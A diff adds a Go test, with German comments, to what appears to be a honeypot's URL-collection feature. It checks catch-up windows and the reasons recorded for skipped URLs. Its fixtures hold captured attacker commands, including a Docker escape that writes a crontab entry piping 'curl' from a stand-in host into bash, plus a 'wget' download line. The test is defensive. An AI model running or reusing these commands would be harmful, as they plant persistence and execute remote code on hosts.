@@ -121,3 +121,43 @@ func TestFamilyNamesDistinct(t *testing.T) {
 		t.Errorf("Namen: %v", names)
 	}
 }
+
+// Dateien sammeln: Adressen von vor dem Einschalten oder aus einer ausgefallenen Runde
+// werden nachgeholt (bis 0.8.0 nur die letzten 30 Minuten); nicht Geholtes hat einen Grund.
+func TestShareSinceCatchesUp(t *testing.T) {
+	allowDoc(t)
+	setOwnNets(OwnNets{Private: true})
+	h := shareHive(t)
+	now := time.Now()
+	h.st.db.Exec(`INSERT INTO events(ts,type,src_ip,service,sensor,as_org,data) VALUES(?,?,?,?,?,?,?)`,
+		now.Add(-3*time.Hour).UnixMilli(), "command", "203.0.113.60", "dockerapi", "", "",
+		`{"input":"create image=alpine cmd=chroot /mnt/ /bin/sh -c echo \"* * * * * root curl http://198.51.100.150/b2f628/cronb.sh|bash\">/etc/crontab binds=/:/mnt"}`)
+	if s := h.shareSince(now); !s.Equal(now.Add(-24 * time.Hour)) {
+		t.Fatalf("erste Runde: %v", now.Sub(s))
+	}
+	finds, err := h.urlFindings(t.Context(), h.shareSince(now), nil)
+	if err != nil || len(finds) != 1 || finds[0].URL != "http://198.51.100.150/b2f628/cronb.sh" {
+		t.Fatalf("Docker-Befehl von vor 3 Stunden nicht gefunden: %v %v", finds, err)
+	}
+	h.st.SetKV("share_since", fmt.Sprint(now.Add(-time.Hour).UnixMilli()))
+	if s := h.shareSince(now); now.Sub(s).Round(time.Second) != 65*time.Minute {
+		t.Fatalf("nach einer Runde: %v", now.Sub(s))
+	}
+	h.st.SetKV("share_since", fmt.Sprint(now.Add(-30*24*time.Hour).UnixMilli()))
+	if s := h.shareSince(now); now.Sub(s) != 48*time.Hour {
+		t.Fatalf("höchstens 48 Stunden: %v", now.Sub(s))
+	}
+	// Gründe für nicht Geholtes
+	x := h.Extras()
+	x.Samples.Enabled = true
+	h.collectSample(t.Context(), x, urlFinding{URL: "tftp://198.51.100.41/x"})
+	addEvent(h, "command", "ssh", "203.0.113.61", "", "Censys, Inc.", map[string]any{"input": "wget http://198.51.100.42/c"})
+	h.urlFindings(t.Context(), now.Add(-time.Hour), h.share.skip)
+	got := map[string]string{}
+	for _, s := range h.share.skips {
+		got[s.URL] = s.Reason
+	}
+	if !strings.Contains(got["tftp://198.51.100.41/x"], "nur http und https") || !strings.Contains(got["http://198.51.100.42/c"], "Forschungsscanner") {
+		t.Fatalf("Gründe: %v", got)
+	}
+}
